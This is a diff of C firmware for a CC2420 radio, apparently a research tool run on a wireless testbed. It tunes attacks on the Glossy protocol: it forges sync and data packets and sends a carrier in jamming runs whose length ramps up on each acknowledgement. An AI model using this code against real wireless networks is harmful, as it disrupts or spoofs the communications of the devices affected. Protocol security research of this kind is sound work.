@@ -108,6 +108,7 @@ static int mode;
 
 static clock_time_t tx_interval = TX_INTERVAL;
 static clock_time_t attack_gap = ATTACK_GAP;
+static clock_time_t carrier_duration = (MAX_TX_PACKETS * TX_INTERVAL);
 static unsigned max_tx_packets = MAX_TX_PACKETS;
 static unsigned payload_len = PAYLOAD_LEN;
 static rtimer_clock_t rtimer_interval = RTIMER_INTERVAL;
@@ -116,8 +117,8 @@ static uint8_t rp_en = 0;
 static uint8_t air = 0;
 static uint8_t hexin = 0;
 static uint8_t tx_source = TX_SOURCE_DROPLETS;
-static uint8_t manual_crc = 1;
-static uint8_t prepend_phy_hdr = 1;
+static uint8_t manual_crc = 0; // switch on if selected droplet is a whole PMDU
+static uint8_t prepend_phy_hdr = 0; // switch on if selected  droplet is a whole PMDU
 static uint16_t max_attack_count = MAX_ATTACK_COUNT;
 
 static struct etimer et, et_run;
@@ -160,10 +161,10 @@ const static uint8_t sfd_3z[] = {0x06, 0x00, 0xA7, 127};
 const static uint8_t sfd_1z_packed[] = {0x70, 0xFA, 0x07, 0xA7, 0x7F}; // two sync hdrs, each 2.5 bytes,  squeezed together
 const static uint8_t all_zeros[128];
 const static uint8_t pellet[128] = {[80]=0x00, 0xA7, 0x04, 0x30, 0x31, 0xA8, 0x96};
-const static uint8_t fake_glossy_header[] = {0x00, 0xA7, 127, 0xA3}; // glossy header: preamble + sfd + len byte + glossy app header nimble (0xA) + glossy pkt type nimble (0x1...0x4)
+const static uint8_t fake_glossy_header[] = {0x00, 0xA7, 28, 0xA3}; // glossy header: preamble + sfd + len byte + glossy app header nimble (0xA) + glossy pkt type nimble (0x1...0x4)
 const static uint8_t glossy_sync_pkt_reversed[] = {0x88, 0x2F, 0x83, 0x2C, 0x8B, 0x88, 0xB6, 0xD5, 0x88, 0x89, 0x88, 0x88, 0xEB, 0xA3}; // preamble + SFD + LEN + 0xA4 + host node id (2B) + current time of host (2B) + N of slots in current round + round period + empty slots (2B)
 const static uint8_t glossy_sync_pkt_payload[] = {0xA4, 0x21, 0x00, 0x3e, 0x5d, 0x00, 0x02, 0x00, 0x00}; // 0xA4 + host node id (2B) + current time of host (2B) + N of slots in current round + round period + empty slots (2B)
-const static uint8_t glossy_data_pkt_payload[] = {0xA3, 0xEE, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00}; // 0xA3 + src addr (2B) + dst addr (2B) + payload size (1B) + no. pkts in queue (1B) + data option (1B) + usr payload ("Hi!")
+const static uint8_t glossy_data_pkt_payload[] = {0xA3, 0xEF, 0x12, 0x00, 0x00, 10, 0x00, 0x00}; // 0xA3 + src addr (2B) + dst addr (2B) + payload size (1B) + no. pkts in queue (1B) + data option (1B) [+ usr payload (N bytes)]
 
 const static struct hex_seq droplets[] =	{
 	{sfd_2z, sizeof(sfd_2z)},
@@ -174,13 +175,14 @@ const static struct hex_seq droplets[] =	{
 	{glossy_sync_pkt_reversed, sizeof(glossy_sync_pkt_reversed)},
 };
 
-static int droplet_index = 4;
+static int droplet_index = 0;
 static uint8_t txfifo_data[128];
 static linkaddr_t dst_addr = { {DST_ADDR0, DST_ADDR1} };
 
 static struct variable const variable_list[] = {
 	{'l', (union number*)&len_hdr, sizeof(len_hdr), "len_hdr", 0, 127},
 	{'t', (union number*)&tx_interval, sizeof(tx_interval), "tx_interval", 0, (unsigned)~0},
+	{'e', (union number*)&carrier_duration, sizeof(carrier_duration), "carrier_duration", 0, (unsigned)~0},
 	{'r', (union number*)&rtimer_interval, sizeof(rtimer_interval), "rtimer_interval", 0, (unsigned)~0},
 	{'y', (union number*)&payload_len, sizeof(payload_len), "payload_len", 0, 127},
 	{'p', (union number*)&max_tx_packets, sizeof(max_tx_packets), "max_tx_packets", 0, (unsigned)~0},
@@ -558,7 +560,7 @@ droplet_mode(int new_mode)
 	CC2420_DISABLE_CCA_INT();
 	CC2420_CLEAR_CCA_INT();
 
-	etimer_set(&et, max_tx_packets * tx_interval + CLOCK_SECOND / 2);
+	etimer_set(&et, carrier_duration + CLOCK_SECOND / 2);
 	/* Start sending Droplets */
 	// add a small jitter (+/-122 us, assuming RTIMER_SECOND = 32768) around the average interval to randomize phase
 	rtimer_set(&rt, RTIMER_NOW() + rtimer_interval - 4 + (random_rand()%9) , 0, send_len_buf, (void *)1);
@@ -670,7 +672,7 @@ drizzle_mode(int new_mode)
 	CC2420_WRITE_FIFO_BUF(txfifo_data, 128);
  start_attack:
 	PROCESS_CONTEXT_BEGIN(&test_process);
-	etimer_set(&et, max_tx_packets * tx_interval);
+	etimer_set(&et, carrier_duration);
 	PROCESS_CONTEXT_END(&test_process);
 	send_carrier(new_mode);
 	ADC1_PORT(OUT) |= BV(ADC1_PIN); // flock lab io tracing signal INT1
@@ -758,24 +760,24 @@ static void
 ack_handler(uint8_t *frame, uint8_t len)
 {
 #define NRUNS 8
+#define ACK_STEP 2
 	static unsigned ack_run = 0;
-	static unsigned long ack_time = 0;
+	static unsigned long ack_began_at = 0;
 	seqno = 0;
 
 
-	if (ack_should_begin(frame, len, ack_time)) {
+	if (ack_should_begin(frame, len, ack_began_at)) {
 		/* skip attack every N runs */
 		if (ack_run % NRUNS == 0) {
 			ack_run++;
 			return;
 		}
-		// ramp up attack duraiton in 2 second steps each run
-		max_tx_packets = ack_run % NRUNS;
-		tx_interval = CLOCK_SECOND * 2;
+		// ramp up attack duraiton in N-second steps each run
+		carrier_duration = (ack_run % NRUNS) * ACK_STEP * CLOCK_SECOND;
 		drizzle_mode(DRIZZLE);
-		ack_time = clock_seconds();
-		printf("ack run %u begins at time %lu, to last %u s\n", 
-		       ack_run++, ack_time, max_tx_packets*2);
+		ack_began_at = clock_seconds();
+		printf("ack run %u begins at time %lu, to last %lu s\n", 
+		       ack_run++, ack_began_at, carrier_duration/CLOCK_SECOND);
 	}
 }
 
